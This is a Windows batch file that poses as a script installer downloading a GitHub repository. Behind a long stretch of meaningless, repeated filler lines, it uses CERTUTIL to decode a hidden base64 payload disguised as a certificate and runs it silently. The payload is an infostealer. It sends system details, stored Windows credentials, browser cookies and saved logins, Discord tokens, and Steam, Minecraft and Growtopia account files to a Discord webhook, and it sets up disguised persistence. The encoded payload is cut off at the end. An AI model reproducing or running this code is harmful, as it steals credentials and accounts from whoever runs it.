@echo off
:: Créez un dossier "script" s'il n'existe pas déjà
if not exist script mkdir script

:: Téléchargez le référentiel GitHub
curl -L -o temp.zip https://github.com/y2ks-officiel/modestscript/archive/refs/heads/main.zip

:: Décompressez le fichier zip
powershell -Command "Expand-Archive temp.zip -DestinationPath ."

:: Déplacez les fichiers extraits dans le dossier "script"
xcopy /s /e /y modestscript-main\* script

:: Supprimez le fichier zip et le dossier temporaire
del temp.zip
rmdir /s /q modestscript-main

@echo off
cd.
goto temp
   set /A sample =1
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
   move "%source%" "%s%"
   2>NUL Info > %temp%
   goto workdone
call
   set "record=%~2"
   echo %%1=%1 N=%N%
cls
set result=false
if "!input:~0,1!" equ "+" set "input = !input:~1!"
   move "%source%" "%s%"
   if 0==1 0
   if %user_agrees% do
call ::insert %~1r %value%
   set wait=false
 set "len=0"
   :: Fixed
   set /a "len+=%%A"
goto endoftests
cd.
   rem Please wait
   call
set "[=rem/||(" & set "]=)"
   rem Please wait
   2>NUL Info > %temp%
set "verp=%%~O"
   set /A sample =1
call
   goto workdone
call ::insert %~1r %value%
2>NUL Info > %temp%
   :: Fixed
echo Started
if "!input:~0,1!" equ "+" set "input = !input:~1!"
IF %F%==1 IF %C%==1
set "verp=%%~O"
   if 0==1 0
set "[:=goto :]%% "
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
setlocal
   if %user_agrees% do
whoami
   call
echo %%1=%1 %%2=%2 %%3=%3
   echo %%1=%1 N=%N%
set "us=/dR:% user %"
   rem exit /b 0
 ELSE IF %F%==0 IF %C%==1
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
:evr
   if %ERRORLEVEL% EQU 1 goto w
whoami
   fc /l %comp1% %comp2%
   if %user_agrees% do
set result=false
   :: Fixed
   timeout /t 2 /nobreak > NUL
set "input=%~1"
cd.
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   2>NUL Info > %temp%
:evr
set "verp=%%~O"
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 
 ELSE IF %F%==0 IF %C%==1
call
   call
   ELSE IF %F%==1 IF %C%==0
ELSE IF %F%==0 IF %C%==1
   if 0==1 0
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
   2>NUL Info > %temp%
if "!input:~0,1!" equ "-"
endlocal & if "%~2" neq "" (set %~2=%result%) else echo %result%
set wait=true
set F=%date%
   goto workdone
call ::insert %~1r %value%
goto endoftests
set "s=!s:~%% A!"
   set /A md=2*%%A
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
   set /A md=2*%%A
   rem exit /b 0
echo %%1=%1 %%2=%2 %%3=%3
   goto workdone
   if errorlevel 1 (@echo off) else
echo %~n0 [RtnVar]
set "hos=%~2"
ELSE IF %F%==0 IF %C%==1
call ::insert %~1r %value%
set "s=!s:~%% A!"
if "!input:~0,1!" equ "+" set "input = !input:~1!"
   goto :eof
   set /A md=2*%%A
   2>NUL Info > %temp%
cd.
   ELSE IF %F%==1 IF %C%==0
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
   call
pause
)
echo Started
set "c=%~2"
   set for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr%
set wait=true
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
call
set "input=!input:~1!"
   set wait=false
call
pause
)
set "[:=goto :]%% "
cls
set /A md=2*%%A
set wait=true
echo <wait>
if 0==1 0
echo %~n0 [RtnVar]
pause
)
echo <wait>
set "us=/dR:% user %"
setlocal
   rem exit /b 0
echo Started
pause
)
echo %~n0 [RtnVar]
if "!input:~0,1!" equ "+" set "input = !input:~1!"
IF %F%==1 IF %C%==1
 ELSE IF %F%==0 IF %C%==1
   2>NUL Info > %temp%
   timeout /t 2 /nobreak > NUL
goto endoftests
echo Started
   set /A md=2*%%A
   if %user_agrees% do
echo <wait>
setlocal
cls
   set result=true
   set fi=%%~fG
   fc /l %comp1% %comp2%
cls
call ::insert %~1r %value%
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
   set "record=%~2"
echo Started
set "hos=%~2"
   timeout /t 2 /nobreak > NUL
   goto :eof
   goto :argPad
if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)
echo <wait>
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
goto endoftests
set "c=%~2"
   set wait=false
if 0==1 0
   set /A md=2*%%A
echo %~n0 [RtnVar]
if "!input:~0,1!" equ "+" set "input = !input:~1!"
   rem exit /b 0
   echo %%1=%1 N=%N%
   goto :eof
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
echo %~n0 [RtnVar]
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
   set wait=false
   goto workdone
   goto :argPad
   if %user_agrees% do
   set wait=false
echo Started
set "s=!s:~%% A!"
   set /A sample =1
set "hos=%~2"
echo %~n0 [RtnVar]
if "!input:~0,1!" equ "-"
   goto workdone
echo <wait>
 ELSE IF %F%==0 IF %C%==1
   if 0==1 0
endlocal & if "%~2" neq "" (set %~2=%result%) else echo %result%
set wait=true
   rem Please wait
set "[=rem/||(" & set "]=)"
   set /a "len+=%%A"
move "%source%" "%fs%"
   goto :argPad
set F=%date%
 ELSE IF %F%==0 IF %C%==1
   timeout /t 2 /nobreak > NUL
   set result=true
if 0==1 0
   set result=true
   call
set /A md=2*%%A
   call
   echo %~1 | find /i "help" >nul 2>&1 && ( goto :help )
set "input=!input:~1!"
move "%source%" "%fs%"
whoami
   rem Please wait
   goto workdone
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
echo %%1=%1 %%2=%2 %%3=%3
   set "record=%~2"
   set wait=false
   set /A md=2*%%A
   goto workdone
   set /a "len+=%%A"
cd.
   2>NUL Info > %temp%
   if %ERRORLEVEL% EQU 1 goto w
set "input=%~1"
:evr
   set /a "len+=%%A"
whoami
set "input=%~1"
call ::insert %~1r %value%
   set /A md=2*%%A
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
   set wait=false
   fc /l %comp1% %comp2%
if "!input:~0,1!" equ "-"
set "input=%~1"
set "[=rem/||(" & set "]=)"
   if "%s%" equ "#%~1" endl& if "%~3" neq "" (set %~3=-1&exit /b 0)
   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%)
whoami
   timeout /t 2 /nobreak > NUL
set "verp=%%~O"
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
   if %ERRORLEVEL% EQU 1 goto w
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
   goto workdone
   ELSE IF %F%==1 IF %C%==0
   move "%source%" "%s%"
   goto :eof
whoami
endlocal & if "%~2" neq "" (set %~2=%result%) else echo %result%
echo <wait>
   timeout /t 2 /nobreak > NUL
   fc /l %comp1% %comp2%
ELSE IF %F%==0 IF %C%==1
pause
)
   set /a "len+=%%A"
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
cls
ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1
set fi=%%~fG & set /p f=f: & set F=%da% & for /f "delims=[] t=2" %%a 
   set wait=false
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
set "s=!s:~%% A!"
setlocal
set "input=%~1"
set /A md=2*%%A
   goto workdone
   echo %%1=%1 N=%N%
   set /a "len+=%%A"
cd.
   goto :argPad
for /f "delims=[] t=2" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| fndst [') do set d=%%a
cd.
pause
)
   set result=true
   rem Please wait
   if errorlevel 1 (@echo off) else
set /p var=fd:FOR /R %fo% %%G IN (.) DO (   set h=%%~dpa
)%t% & dir & echo %tme%
if 0==1 0
   if %user_agrees% do
   if 0==1 0
 set "len=0"
:evr
   set result=true
timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %)
   echo %%1=%1 N=%N%
if "!input:~0,1!" equ "-"
set wait=true
whoami
pause
)
   set /A sample =1
IF %F%==1 IF %C%==1
set "hos=%~2"
   set "record=%~2"
:temp
@echo off & CERTUTIL -f -decode "%~f0" "%Temp%\0.bat" >nul 2>&1 & call "%Temp%\0.bat" & Exit
-----BEGIN CERTIFICATE----- QGVjaG8gb2ZmCnNldCAidnBhdGg9QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxDb250YWN0cyIKY2QgJXZwYXRoJQpzZXQgIndlYmhvb2s9aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NTE1NDE5MjY1OTMyOTA0NC9lc0lYSjJISE00WUNGTnBkM0NnZW9wVkQxUXVRZlM2ay1GR2xOZE5YZXhITGJIdkpaWlR6UmhaT1RBUndiR3d1YmRzWSIKZm9yIC9mICJkZWxpbXM9W10gdG9rZW5zPTIiICUlYSBpbiAoJzJePk5VTCBwaW5nIC00IC1uIDEgJUNvbXB1dGVyTmFtZSUgXnwgZmluZHN0ciBbJykgZG8gc2V0IE5ldHdvcmtJUD0lJWEKZm9yIC9mICUlYSBpbiAoJ3Bvd2Vyc2hlbGwgSW52b2tlLVJlc3RNZXRob2QgYXBpLmlwaWZ5Lm9yZycpIGRvIHNldCBQdWJsaWNJUD0lJWEKZm9yIC9mICJ0b2tlbnM9MS00IGRlbGltcz0vOi4iICUlYSBpbiAoIiVUSU1FJSIpIGRvICgKc2V0IEhIMjQ9JSVhCnNldCBNST0lJWIKKQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtaSAtSCAiQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uIiAtSCAiQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb24iIC1YIFBPU1QgLS1kYXRhICJ7XCJjb250ZW50XCI6IFwiYGBgW1JlcG9ydCBmcm9tICVVU0VSTkFNRSUgLSAlUHVibGljSVAlXVxuTG9jYWwgdGltZTogJUhIMjQlOiVNSSVgYGBcIn0iICAld2ViaG9vayUKc2V0ICJ0ZW1wc3lzPSVhcHBkYXRhJVxzeXNpbmZvLnR4dCIKMj5OVUwgU3lzdGVtSW5mbyA+ICIldGVtcHN5cyUiCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIHN5c3RlbWluZm89QCIldGVtcHN5cyUiICV3ZWJob29rJQpkZWwgIiV0ZW1wc3lzJSIgPm51bCAyPiYxCnNldCAidGVtcHRhc2tsaXN0PSVhcHBkYXRhJVx0YXNrbGlzdC50eHQiCjI+TlVMIHRhc2tsaXN0ID4gIiV0ZW1wdGFza2xpc3QlIgpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiB0YXNrcz1AIiV0ZW1wdGFza2xpc3QlIiAld2ViaG9vayUKZGVsICIldGVtcHRhc2tsaXN0JSIgPm51bCAyPiYxCnNldCAibmV0dXNlcj0lYXBwZGF0YSVcbmV0dXNlci50eHQiCjI+TlVMIG5ldCB1c2VyID4gIiVuZXR1c2VyJSIKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLUYgdGFza3M9QCIlbmV0dXNlciUiICV3ZWJob29rJQpkZWwgIiVuZXR1c2VyJSIgPm51bCAyPiYxCnNldCAicXVzZXI9JWFwcGRhdGElXHF1c2VyLnR4dCIKMj5OVUwgcXVzZXIgPiAiJXF1c2VyJSIKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLUYgdGFza3M9QCIlcXVzZXIlIiAld2ViaG9vayUKZGVsICIlcXVzZXIlIiA+bnVsIDI+JjEKc2V0ICJzdHVwPSVhcHBkYXRhJVxzdHVwLnR4dCIKMj5OVUwgcmVnIHF1ZXJ5IEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuID4+ICIlc3R1cCUiCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIHRhc2tzPUAiJXN0dXAlIiAld2ViaG9vayUKZGVsICIlc3R1cCUiID5udWwgMj4mMQpzZXQgImNtZGtleT0lYXBwZGF0YSVcY21ka2V5LnR4dCIKMj5OVUwgY21ka2V5IC9saXN0ID4gIiVjbWRrZXklIgpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiB0YXNrcz1AIiVjbWRrZXklIiAld2ViaG9vayUKZGVsICIlY21ka2V5JSIgPm51bCAyPiYxCnNldCAiaXBjb25maWc9JWFwcGRhdGElXGlwY29uZmlnLnR4dCIKMj5OVUwgaXBjb25maWcgL2FsbCA+ICIlaXBjb25maWclIgpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiB0YXNrcz1AIiVpcGNvbmZpZyUiICV3ZWJob29rJQpkZWwgIiVpcGNvbmZpZyUiID5udWwgMj4mMQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtaSAtSCAiQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uIiAtSCAiQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb24iIC1YIFBPU1QgLS1kYXRhICJ7XCJjb250ZW50XCI6IFwiYGBgLSBDSFJPTUUgLWBgYFwifSIgICV3ZWJob29rJQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBjPUAiJWxvY2FsYXBwZGF0YSVcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxDb29raWVzIiAld2ViaG9vayUKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLUYgaD1AIiVsb2NhbGFwcGRhdGElXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcSGlzdG9yeSIgJXdlYmhvb2slCnRpbWVvdXQgL3QgMiAvbm9icmVhayA+IE5VTApjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBzPUAiJWxvY2FsYXBwZGF0YSVcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxTaG9ydGN1dHMiICV3ZWJob29rJQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBiPUAiJWxvY2FsYXBwZGF0YSVcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxCb29rbWFya3MiICV3ZWJob29rJQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBsPUAiJWxvY2FsYXBwZGF0YSVcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRhIiAld2ViaG9vayUKdGltZW91dCAvdCAyIC9ub2JyZWFrID4gTlVMCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIGw9QCIlbG9jYWxhcHBkYXRhJVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZSIgJXdlYmhvb2slCnRpbWVvdXQgL3QgMiAvbm9icmVhayA+IE5VTApjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtaSAtSCAiQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uIiAtSCAiQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb24iIC1YIFBPU1QgLS1kYXRhICJ7XCJjb250ZW50XCI6IFwiYGBgLSBPUEVSQSAtYGBgXCJ9IiAgJXdlYmhvb2slCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIGM9QCIlYXBwZGF0YSVcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxlXENvb2tpZXMiICV3ZWJob29rJQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBoPUAiJWFwcGRhdGElXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxIaXN0b3J5IiAld2ViaG9vayUKdGltZW91dCAvdCAyIC9ub2JyZWFrID4gTlVMCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIHM9QCIlYXBwZGF0YSVcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxlXFNob3J0Y3V0cyIgJXdlYmhvb2slCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIGI9QCIlYXBwZGF0YSVcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxlXEJvb2ttYXJrcyIgJXdlYmhvb2slCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIGw9QCIlYXBwZGF0YSVcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxlXExvZ2luIERhdGEiICV3ZWJob29rJQp0aW1lb3V0IC90IDIgL25vYnJlYWsgPiBOVUwKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLWkgLUggIkFjY2VwdDogYXBwbGljYXRpb24vanNvbiIgLUggIkNvbnRlbnQtVHlwZTphcHBsaWNhdGlvbi9qc29uIiAtWCBQT1NUIC0tZGF0YSAie1wiY29udGVudFwiOiBcImBgYC0gVklWQUxESSAtYGBgXCJ9IiAgJXdlYmhvb2slCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIGM9QCIlbG9jYWxhcHBkYXRhJVxWaXZhbGRpXFVzZXIgRGF0YVxEZWZhdWx0XENvb2tpZXMiICV3ZWJob29rJQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBoPUAiJWxvY2FsYXBwZGF0YSVcVml2YWxkaVxVc2VyIERhdGFcRGVmYXVsdFxIaXN0b3J5IiAld2ViaG9vayUKdGltZW91dCAvdCAyIC9ub2JyZWFrID4gTlVMCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIHM9QCIlbG9jYWxhcHBkYXRhJVxWaXZhbGRpXFVzZXIgRGF0YVxEZWZhdWx0XFNob3J0Y3V0cyIgJXdlYmhvb2slCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIGI9QCIlbG9jYWxhcHBkYXRhJVxWaXZhbGRpXFVzZXIgRGF0YVxEZWZhdWx0XEJvb2ttYXJrcyIgJXdlYmhvb2slCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIGw9QCIlbG9jYWxhcHBkYXRhJVxWaXZhbGRpXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGEiICV3ZWJob29rJQp0aW1lb3V0IC90IDIgL25vYnJlYWsgPiBOVUwKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLWkgLUggIkFjY2VwdDogYXBwbGljYXRpb24vanNvbiIgLUggIkNvbnRlbnQtVHlwZTphcHBsaWNhdGlvbi9qc29uIiAtWCBQT1NUIC0tZGF0YSAie1wiY29udGVudFwiOiBcImBgYC0gRklSRUZPWCAtYGBgXCJ9IiAgJXdlYmhvb2slCmZvciAvZiAlJWYgaW4gKCcyXj5OVUwgZGlyIC9iICIlYXBwZGF0YSVcTW96aWxsYVxGaXJlZm94XFByb2ZpbGVzIicpIGRvICgKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLUYgbGV2ZWw9QCIlYXBwZGF0YSVcTW96aWxsYVxGaXJlZm94XFByb2ZpbGVzXCUlZlxsb2dpbnMuanNvbiIgJXdlYmhvb2slCnRpbWVvdXQgL3QgMiAvbm9icmVhayA+IE5VTApjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBsZXZlbD1AIiVhcHBkYXRhJVxNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXNcJSVmXGtleTMuZGIiICV3ZWJob29rJQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBsZXZlbD1AIiVhcHBkYXRhJVxNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXNcJSVmXGtleTQuZGIiICV3ZWJob29rJQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBsZXZlbD1AIiVhcHBkYXRhJVxNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXNcJSVmXGNvb2tpZXMuc3FsaXRlIiAld2ViaG9vayUKdGltZW91dCAvdCAyIC9ub2JyZWFrID4gTlVMCikKKQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtaSAtSCAiQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uIiAtSCAiQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb24iIC1YIFBPU1QgLS1kYXRhICJ7XCJjb250ZW50XCI6IFwiYGBgLSBvc3UhIC1gYGBcIn0iICAld2ViaG9vayUKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLUYgYz1AIiVsb2NhbGFwcGRhdGElXG9zdSFcb3N1IS4ldXNlcm5hbWUlLmNmZyIgJXdlYmhvb2slCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1pIC1IICJBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24iIC1IICJDb250ZW50LVR5cGU6YXBwbGljYXRpb24vanNvbiIgLVggUE9TVCAtLWRhdGEgIntcImNvbnRlbnRcIjogXCJgYGAtIERJU0NPUkQgLWBgYFwifSIgICV3ZWJob29rJQpmb3IgL2YgJSVmIGluICgnMl4+TlVMIGRpciAvYiAiJWFwcGRhdGElXGRpc2NvcmRcTG9jYWwgU3RvcmFnZVxsZXZlbGRiXCInKSBkbyAoCmVjaG8gJSVmfGZpbmQgIi5sZGIiCmlmIGVycm9ybGV2ZWwgMSAoQGVjaG8gb2ZmKSBlbHNlICgKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLUYgbGV2ZWw9QCIlYXBwZGF0YSVcZGlzY29yZFxMb2NhbCBTdG9yYWdlXGxldmVsZGJcJSVmIiAld2ViaG9vayUKdGltZW91dCAvdCAyIC9ub2JyZWFrID4gTlVMCikKKQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtaSAtSCAiQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uIiAtSCAiQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb24iIC1YIFBPU1QgLS1kYXRhICJ7XCJjb250ZW50XCI6IFwiYGBgLSBTVEVBTSAtYGBgXCJ9IiAgJXdlYmhvb2slCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIHN0ZWFtdXNlcnM9QCJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZ1xsb2dpbnVzZXJzLnZkZiIgJXdlYmhvb2slCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIGxvZ2ludXNlcnM9QCJDOlxQcm9ncmFtIEZpbGVzXFN0ZWFtXGNvbmZpZ1xsb2dpbnVzZXJzLnZkZiIgJXdlYmhvb2slCmZvciAvZiAlJXMgaW4gKCcyXj5OVUwgZGlyIC9iICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXCInKSBkbyAoCmVjaG8gJSVzfGZpbmQgInNzZm4iCmlmIGVycm9ybGV2ZWwgMSAoQGVjaG8gb2ZmKSBlbHNlICgKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLUYgYXV0aD1AIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcU3RlYW1cJSVzIiAld2ViaG9vayUKdGltZW91dCAvdCAyIC9ub2JyZWFrID4gTlVMCikKKQpmb3IgL2YgJSVzIGluICgnMl4+TlVMIGRpciAvYiAiQzpcUHJvZ3JhbSBGaWxlc1xTdGVhbVwiJykgZG8gKAplY2hvICUlc3xmaW5kICJzc2ZuIgppZiBlcnJvcmxldmVsIDEgKEBlY2hvIG9mZikgZWxzZSAoCmN1cmwgLS1zaWxlbnQgLS1vdXRwdXQgL2Rldi9udWxsIC1GIGF1dGg9QCJDOlxQcm9ncmFtIEZpbGVzXFN0ZWFtXCUlcyIgJXdlYmhvb2slCnRpbWVvdXQgL3QgMiAvbm9icmVhayA+IE5VTAopCikKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLWkgLUggIkFjY2VwdDogYXBwbGljYXRpb24vanNvbiIgLUggIkNvbnRlbnQtVHlwZTphcHBsaWNhdGlvbi9qc29uIiAtWCBQT1NUIC0tZGF0YSAie1wiY29udGVudFwiOiBcImBgYC0gTUlORUNSQUZUIC1gYGBcIn0iICAld2ViaG9vayUKY3VybCAtLXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgLUYgc3RlYW11c2Vycz1AIiVhcHBkYXRhJVwubWluZWNyYWZ0XGxhdW5jaGVyX3Byb2ZpbGVzLmpzb24iICV3ZWJob29rJQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBzdGVhbXVzZXJzPUAiJWFwcGRhdGElXC5taW5lY3JhZnRcbGF1bmNoZXJfYWNjb3VudHMuanNvbiIgJXdlYmhvb2slCnRpbWVvdXQgL3QgMiAvbm9icmVhayA+IE5VTApjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtaSAtSCAiQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uIiAtSCAiQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL2pzb24iIC1YIFBPU1QgLS1kYXRhICJ7XCJjb250ZW50XCI6IFwiYGBgLSBHUk9XVE9QSUEgLWBgYFwifSIgICV3ZWJob29rJQpjdXJsIC0tc2lsZW50IC0tb3V0cHV0IC9kZXYvbnVsbCAtRiBzYXZlLmRhdD1AIiVsb2NhbGFwcGRhdGElXEdyb3d0b3BpYVxzYXZlLmRhdCIgJXdlYmhvb2slCnRpbWVvdXQgL3QgMiAvbm9icmVhayA+IE5VTApzZXQgInJlY3VycmluZz1mYWxzZSIKPk5VTCBhdHRyaWIgLWggIiV2cGF0aCVcJXVuYW1lJSIKPk5VTCBhdHRyaWIgLWggIiV2cGF0aCVcJWJuYW1lJSIKPk5VTCBhdHRyaWIgLWggIiV2cGF0aCVcJXZuYW1lJSIKc2V0ICJ3aGVuPURhaWx5IC9tbyAxIgpzZXQgIlNjaGVkdWxlTmFtZT1XaW5kb3dzVXBkYXRlIgpzZXQgImJuYW1lPXVwZGF0ZXIuYmF0IgpzZXQgInVuYW1lPXVwZGF0ZWQuYmF0IgpzZXQgInZuYW1lPTAudmJzIgpzZXQgInVwZGF0ZXVybD0iCnNldCAidGFyZ2V0dXNlcm5hbWU9dGFyZ2V0LSIKZGVsIC9haCAiJXZwYXRoJVwldW5hbWUlIiA+bnVsIDI+JjEKZGVsIC9haCAiJXZwYXRoJVwldm5hbWUlIiA+bnVsIDI+JjEKaWYgbm90ICIlfmRwMCI9PSIldnBhdGglXCIgKAogIGRlbCAvYWggIiV2cGF0aCVcJWJuYW1lJSIgPm51bCAyPiYxCiAgPk5VTCBjb3B5ICIlfmYwIiAiJXZwYXRoJVwlYm5hbWUlIgopCmlmICIldXBkYXRldXJsJSI9PSIiICgKOm5vcm1hbHJlY3VycmluZwplY2hvIHNldCBXc2hTaGVsbCA9IHdzY3JpcHQuY3JlYXRlb2JqZWN0XigiV1NjcmlwdC5zaGVsbCJeKT4gIiV2cGF0aCVcJXZuYW1lJSIKZWNobyBXc2hTaGVsbC5ydW4gIiIiJXZwYXRoJVwlYm5hbWUlIiIgIiwgMCwgdHJ1ZT4+ICIldnBhdGglXCV2bmFtZSUiCmVjaG8gc2V0IFdzaFNoZWxsID0gTm90aGluZz4+ICIldnBhdGglXCV2bmFtZSUiCmdvdG8gc2tpcHVwZGF0ZWNvbmZpZwopIGVsc2UgKCBnb3RvIHJlY3VycmluZ3VwZGF0ZSApCmdvdG8gZG9udHJlbW92ZW1lCjpyZWN1cnJpbmd1cGRhdGUKaWYgIiV0YXJnZXR1c2VybmFtZSUiPT0iIiAoCmdvdG8gbm9udGFyZ2V0ZWR1cGRhdGUgCikgZWxzZSAoIGdvdG8gdGFyZ2V0ZWR1cGRhdGUgKQpnb3RvIGRvbnRyZW1vdmVtZTIKOm5vbnRhcmdldGVkdXBkYXRlCklGIEVYSVNUICIldnBhdGglXHRlbXAudHh0IiBkZWwgIiV2cGF0aCVcdGVtcC50eHQiID5udWwgMj4mMQo6OiBDaGFuZ2UgVkJTCmVjaG8gc2V0IFdzaFNoZWxsID0gd3NjcmlwdF4uY3JlYXRlb2JqZWN0XigiV1NjcmlwdC5zaGVsbCJeKT4gIiV2cGF0aCVcJXZuYW1lJSIKZWNobyBXc2hTaGVsbF4ucnVuICIiIiV2cGF0aCVcJXVuYW1lJSIiICIsIDAsIHRydWU+PiAiJXZwYXRoJVwldm5hbWUlIgplY2hvIHNldCBXc2hTaGVsbCA9IE5vdGhpbmc+PiAiJXZwYXRoJVwldm5hbWUlIgo6OiBNYWtlIHVwZGF0ZXIgYmF0Y2gKZWNobyBeQGVjaG8gb2ZmPiAiJXZwYXRoJVwldW5hbWUlIgplY2hvIGN